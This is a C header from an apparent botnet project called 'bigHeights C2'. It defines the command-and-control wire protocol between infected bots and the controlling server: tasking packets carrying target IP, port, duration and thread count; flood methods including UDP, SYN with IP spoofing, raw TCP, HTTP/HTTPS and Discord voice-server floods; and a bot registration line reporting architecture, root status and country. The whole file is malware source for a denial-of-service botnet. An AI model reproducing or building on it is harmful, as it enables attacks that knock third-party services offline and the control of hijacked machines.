// language: C, file: shared/protocol.h
// *single wire contract for bigHeights C2 — bot<->CNC and CNC->bot. mirrors cnc/internal/protocol/protocol.go*
#ifndef BIGHEIGHTS_PROTOCOL_H
#define BIGHEIGHTS_PROTOCOL_H

#include <stdint.h>

#define BH_MAGIC          0xB16B00B5u   /* marks a CNC->bot tasking packet */
#define BH_VERSION        1

/* ---- method IDs — first byte of every CNC->bot attack packet ---- */
enum bh_method {
    BH_M_UDP        = 0x01,   /* port= threads= len=                       */
    BH_M_TCP        = 0x02,   /* port= threads= len=                       */
    BH_M_TCPRAW     = 0x03,   /* port= threads= flags= tos= seq=          */
    BH_M_ACK        = 0x04,   /* port= threads= tos=                      */
    BH_M_SYN        = 0x05,   /* port= threads= tos= spoof=               */
    BH_M_PPS        = 0x06,   /* port= threads= len=                      */
    BH_M_STORM      = 0x07,   /* port= threads= ppsmin= ppsmax=           */
    BH_M_HEX        = 0x08,   /* port (positional), mode=normal           */
    BH_M_DISCORD    = 0x09,   /* threads= endpoint=                       */
    BH_M_HTTP       = 0x0A,   /* port= threads= path= method= keepalive=  */
    BH_M_HTTPS      = 0x0B,   /* same as HTTP, TLS internal              */
};

/* ---- opcodes — what the CNC is telling the bot to do ---- */
enum bh_opcode {
    BH_OP_ATTACK    = 0x01,
    BH_OP_STOP      = 0x02,   /* stop one attack by pid                    */
    BH_OP_STOP_ALL  = 0x03,   /* hold / release affects new only; this is kill */
    BH_OP_PING      = 0x04,
};

/* ---- TCP flag bits for tcpraw flags= (syn/ack/rst/psh/all) ---- */
#define BH_TCP_SYN  0x01
#define BH_TCP_ACK  0x02
#define BH_TCP_RST  0x04
#define BH_TCP_PSH  0x08
#define BH_TCP_ALL  0x0F

/* ---- registration line — bot speaks first on 9111, newline-terminated ----
 * format: "arch=<arch> cores=<n> ram=<mb> rooted=<0|1> country=<CC>\n"
 * kept as plain text so a bot can send it in one write() with no struct. */

/* ---- fixed header on every CNC->bot packet ---- */
struct __attribute__((packed)) bh_task_hdr {
    uint32_t magic;      /* BH_MAGIC                                  */
    uint8_t  version;    /* BH_VERSION                                */
    uint8_t  opcode;     /* enum bh_opcode                            */
    uint8_t  method;     /* enum bh_method (0 for STOP/PING)          */
    uint8_t  duration;   /* seconds, 0-255                            */
    uint32_t pid;        /* attack id, CNC-assigned                   */
    uint32_t target_ip;  /* network byte order                        */
    uint16_t port;       /* host byte order                            */
    uint8_t  threads;    /* worker count                               */
    uint8_t  _pad;
};

/* ---- method-specific tails, appended after bh_task_hdr ----
 * only the tail matching hdr.method is present. parsed sequentially. */

struct __attribute__((packed)) bh_tail_len {           /* udp, tcp, pps */
    uint16_t len;
};

struct __attribute__((packed)) bh_tail_tcpraw {        /* tcpraw, syn, ack */
    uint8_t  flags;      /* BH_TCP_* bits, 0 = method default   */
    uint8_t  tos;        /* IP TOS byte                          */
    uint32_t seq;        /* 0 = random per packet                */
    uint8_t  spoof;      /* 0/1                                 */
};

struct __attribute__((packed)) bh_tail_storm {         /* storm */
    uint16_t ppsmin;     /* default 1024                        */
    uint16_t ppsmax;     /* default 2400                        */
};

struct __attribute__((packed)) bh_tail_http {          /* http, https */
    uint8_t  keepalive;  /* 0/1                                 */
    uint8_t  req_method; /* 0=GET 1=POST                        */
    uint16_t path_len;
    /* path bytes follow immediately */
};

struct __attribute__((packed)) bh_tail_discord {       /* discord */
    uint32_t endpoint;   /* voice server ip, net order, 0=resolve-from-call */
};

/* hex carries no tail — mode is always "normal", whole packet is random bytes */

/* ---- convenience: total size of an attack packet ---- */
static inline uint32_t bh_attack_size(uint8_t method, uint16_t path_len) {
    uint32_t n = sizeof(struct bh_task_hdr);
    switch (method) {
        case BH_M_UDP: case BH_M_TCP: case BH_M_PPS:  n += sizeof(struct bh_tail_len);  break;
        case BH_M_TCPRAW: case BH_M_SYN: case BH_M_ACK:n += sizeof(struct bh_tail_tcpraw);break;
        case BH_M_STORM:                              n += sizeof(struct bh_tail_storm); break;
        case BH_M_HTTP: case BH_M_HTTPS:              n += sizeof(struct bh_tail_http) + path_len; break;
        case BH_M_DISCORD:                            n += sizeof(struct bh_tail_discord); break;
        case BH_M_HEX:                                                                      break;
        default: break;
    }
    return n;
}

#endif /* BIGHEIGHTS_PROTOCOL_H */